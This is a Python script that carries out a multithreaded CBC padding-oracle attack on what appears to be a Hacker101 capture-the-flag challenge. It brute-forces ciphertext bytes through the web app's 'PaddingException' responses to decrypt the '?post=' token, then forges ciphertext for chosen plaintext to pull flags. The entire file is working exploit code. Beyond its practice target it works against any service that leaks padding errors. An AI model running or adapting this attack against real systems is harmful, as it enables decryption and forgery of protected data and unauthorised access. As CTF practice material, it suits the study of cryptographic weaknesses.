import re
import sys
import time
import os
import base64
import binascii
import requests
import threading
import copy
import json
from hashlib import md5
from enum import Enum
from datetime import datetime
import numpy as np
import logging
is_py2 = sys.version[0] == '2'
if is_py2:
    import Queue as queue
else:
    import queue as queue

__fmt__='%(levelname)s %(funcName)s: %(message)s '
logging.basicConfig(level=logging.INFO, format=__fmt__)

BLOCK_SIZE = 16

PRE_CALC_CT_BLOCK = [0] * 16
PRE_CALC_PrePT_BLOCK = [0] * 16

f = lambda x : (x if isinstance(x, int) else ord(x))

pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * \
                chr(BLOCK_SIZE - len(s) % BLOCK_SIZE)
unpad = lambda s: s[:-ord(s[len(s) - 1:])]

b64d = lambda x: binascii.a2b_base64(x.replace('~', '=').replace('!', '/').replace('-', '+'))
b64e = lambda x: binascii.b2a_base64(x).replace(b'=', b'~').replace(b'/', b'!').replace(b'+', b'-')

curTime = lambda: str(datetime.now().strftime("%H:%M:%S"))


threadLock_get_prePT_for_block_b = threading.Lock()
maxthreads_get_prePT_for_block_b = 5
sema_get_prePT_for_block_b = threading.Semaphore(value=maxthreads_get_prePT_for_block_b)

threadLock_try_k_at_pos = threading.Lock()
maxthreads_try_k_at_pos = 24  # Best performance in my environment
sema_try_k_at_pos = threading.Semaphore(value=maxthreads_try_k_at_pos)



class NotFoundError(Exception):
   """ Raised when couldn't find the expected item """
   pass

def urlToCT(url):
    data = b64d(url.split("/?post=", 1)[1])
    tmpl = list(bytes(data))
    return [tmpl[i:i+16] for i in range(0, len(tmpl), 16)] # 2 dimentional list

# python 3 code
def CTToUrl(CT):
    blocknum = len(CT)
    tmpl = [ CT[b][i] for b in range(0, blocknum) for i in range(0, BLOCK_SIZE) ]
    data = bytearray(tmpl)
    str_b64 = str(binascii.b2a_base64(data, newline=False))
    str_b64 = str_b64.replace('b\'', '').replace('\'', '')
    url = URL_PREFIX + str_b64.replace('=', '~').replace('+', '-').replace('/', '!')
    return url


class FindkResult(Enum):
    NotFound = 0
    FoundPotential = 1
    FoundFlag = 2

def listsEqual(x, y):
    # XXX : Performance can be improved
    lx = [i if isinstance(i, int) else ord(i) for i in x ]
    ly = [j if isinstance(j, int) else ord(j) for j in y ]
    return (lx == ly)

def sendHttpRequest(url):
    response = None
    for _ in range(100):
        try:
            response = requests.get(url)
            break
        except (requests.ConnectionError):
            logging.info("Connection timeout. Retrying")
        time.sleep(3)

    if response.status_code == 404:
        raise Exception("404 Not Found. The url is no longer available. "
                "Please go to hacker101 and reset the page")

    try:
        return str(response.content)
    except Exception as e:
        logging.error("Other Error: " + str(e) + ". url = " + url)
        raise Exception("Other error occured when sending http request")


def printBlock(block):
    if logging.getLogger().getEffectiveLevel() == logging.DEBUG:
        logging.debug(["0x{:02x}".format(x) for x in block])

class Job_try_k_at_pos(threading.Thread):

    def __init__(self, k, test_pos, cooked_IV, CT_block, out_queue, threads):
        threading.Thread.__init__(self)

        self.shutdown_flag = threading.Event()
        self.k = k
        self.pos = test_pos
        self.cooked_IV = copy.deepcopy(cooked_IV)
        self.CT_block = copy.deepcopy(CT_block)
        self.out_queue = out_queue
        self.threads = threads
 
    def run(self):
        sema_try_k_at_pos.acquire()
        if not self.shutdown_flag.is_set():
            # filling a byte for the previous ciphertext block
            self.cooked_IV[self.pos] = self.k
            url = CTToUrl([self.cooked_IV, self.CT_block])
            resp = sendHttpRequest(url)
            result = FindkResult.NotFound

            if ("PaddingException" not in resp):
                result = FindkResult.FoundPotential
                if ("FLAG" in resp):
                    result = FindkResult.FoundFlag
                    threadLock_try_k_at_pos.acquire()
                    for t in self.threads:
                        t.shutdown_flag.set()
                    threadLock_try_k_at_pos.release()
                elif ("doctype html" in resp):
                    result = FindkResult.FoundPotential

            threadLock_try_k_at_pos.acquire()
            self.out_queue.put((result, self.k))
            threadLock_try_k_at_pos.release()
            time.sleep(0.5)

        sema_try_k_at_pos.release()

def decrypt_CT_block(CT_block):

    cooked_IV = [0] * 16
    prePT_block = [0] * 16

    for pos in range(15, -1, -1):

        logging.debug("pos=" + str(pos))
        pad = 16 - pos

        # filling bytes for the previous ciphertext block
        for i in range(15, pos, -1):
            cooked_IV[i] = (prePT_block[i] ^ pad)

        my_queue = queue.Queue()
        my_queue.queue.clear()
        threads = []

        for k in range(0, 256):
            t = Job_try_k_at_pos(k, pos, cooked_IV, CT_block, my_queue, threads)
            t.daemon = True
            t.start()
            threads.append(t)

        for t in threads:
            t.join()

        found_potential_k = False
        best_k = 0
        while not my_queue.empty():
            (result, k) = my_queue.get()
            if result == FindkResult.FoundFlag:
                found_potential_k = True
                best_k = k
                break
            elif result == FindkResult.FoundPotential:
                found_potential_k = True
                best_k = k

        if not found_potential_k:
            raise NotFoundError("Unable to find prePT_block[" + str(pos) + "] ")

        prePT_block[pos] = (best_k ^ pad)

    return prePT_block[0:16]


def get_prePT_for_block_b(CT, b, out_queue):
    sema_get_prePT_for_block_b.acquire()

    logging.info("Calculating for Block " + str(b) + " ...")
    prePT_block = [0] * 16
    prePT_block = decrypt_CT_block(CT[b])
    threadLock_get_prePT_for_block_b.acquire()
    out_queue.put((b, prePT_block))
    logging.info("Done with Block " + str(b))

    printBlock(prePT_block) # print if logging level is logging.DEBUG
    threadLock_get_prePT_for_block_b.release()
    sema_get_prePT_for_block_b.release()


def decrypt_CT_and_get_PT_prePT(url):

    CT = urlToCT(url)
    blocknum = len(CT)

    CT_array = [ CT[b][i] for b in range(0, blocknum) for i in range(0, BLOCK_SIZE) ]

    my_queue = queue.Queue()
    threads = []

    for b in range(blocknum - 1, 0, -1):
        t = threading.Thread(target=get_prePT_for_block_b, args=(CT, b, my_queue,))
        t.daemon = True
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    prePT_block = [0] * 16
    prePT = [[0] * 16 for _ in range(blocknum)]
    PT    = [[0] * 16 for _ in range(blocknum)]

    while not my_queue.empty():
        (b , prePT_block) = my_queue.get()
        prePT[b] = prePT_block

    logging.debug("\nDone calculating prePT")

    for b in range(blocknum - 1, 0, -1):
        prePT_block = prePT[b]
        PT_block = [0] * 16
        PT_block = [ prePT_block[i] ^ f(CT[b-1][i]) for i in range(0, BLOCK_SIZE) ]
        PT[b] = copy.deepcopy(PT_block)

        printBlock(PT[b])

    return prePT, PT


def get_2nd_flag(orig_url):
    start = time.time()

    orig_prePT, orig_PT = decrypt_CT_and_get_PT_prePT(orig_url)

    CT = urlToCT(orig_url)
    blocknum = len(CT)
    orig_PT_array = [ orig_PT[b][i] for b in range(0, blocknum) for i in range(0, BLOCK_SIZE) ]

    jstr = unpad(bytearray(orig_PT_array[BLOCK_SIZE:])).decode("utf-8")
    jobj = json.loads(jstr)
    flag_str = jobj['flag']
    logging.info("flag found = " + flag_str)

    return flag_str        


def gen_CT_for_desired_PT_str(desired_PT_str):
    global PRE_CALC_CT_BLOCK
    global PRE_CALC_PrePT_BLOCK
    if (listsEqual(PRE_CALC_PrePT_BLOCK, [0] * 16)):
        PRE_CALC_PrePT_BLOCK = decrypt_CT_block(PRE_CALC_CT_BLOCK)
    return gen_CT_for_desired_PT_str_with_pre_calc( \
            PRE_CALC_CT_BLOCK, PRE_CALC_PrePT_BLOCK, desired_PT_str)

def gen_CT_for_desired_PT_str_with_pre_calc( \
        pre_calc_CT_block, pre_calc_prePT_block, desired_PT_str):

    padded_desired_PT_str = pad(desired_PT_str)
    blocknum = int(len(padded_desired_PT_str) / 16)
    desired_PT = [[0] * 16 for _ in range(blocknum)]
    desired_PT = [padded_desired_PT_str[i:i+16] \
            for i in range(0, len(padded_desired_PT_str), 16)]
    desired_PT.insert(0, [0] * 16)
    blocknum = blocknum + 1

    cooked_CT    = [[0] * 16 for _ in range(blocknum)]
    cooked_prePT = [[0] * 16 for _ in range(blocknum)]
    cooked_CT[-1]    = pre_calc_CT_block    
    cooked_prePT[-1] = pre_calc_prePT_block

    # Calculating cooked_CT
    for b in range(blocknum - 1, 0, -1):
        cooked_CT[b-1] = [ cooked_prePT[b][i] ^ f(desired_PT[b][i]) for i in range(0, 16) ]
        if (b-1 > 0):
            cooked_prePT[b-1] = decrypt_CT_block(cooked_CT[b-1])

    return cooked_CT

def get_1st_and_3rd_flag():
    start = time.time()

    desired_PT_str = '{"id":"1"}'
    cooked_CT =  gen_CT_for_desired_PT_str(desired_PT_str)
    cooked_url = CTToUrl(cooked_CT)
    logging.debug("cooked_url = " + cooked_url)
    logging.debug("desired_PT_str = " + desired_PT_str)
    resp_str = str(requests.get(cooked_url).content)

    logging.debug("response = " + resp_str)
    flags_found = [x.group() for x in re.finditer(r'\^FLAG\^(.*?)\$FLAG\$', resp_str)]
    logging.info("flags found = ")
    logging.info(flags_found)

if __name__ == "__main__":
    arg_num = len(sys.argv)
    if (arg_num != 2):
        err_str = "Wrong Input. Input format: ./script.py 'http://....."
        sys.exit(err_str)

    orig_url = str(sys.argv[1])
    URL_PREFIX = orig_url.split('=', 1)[0] + '='
    logging.info("\norig_url = " + orig_url)

    # Sanatization check: see if the server is still available
    sendHttpRequest(orig_url) 

    get_2nd_flag(orig_url)
    get_1st_and_3rd_flag()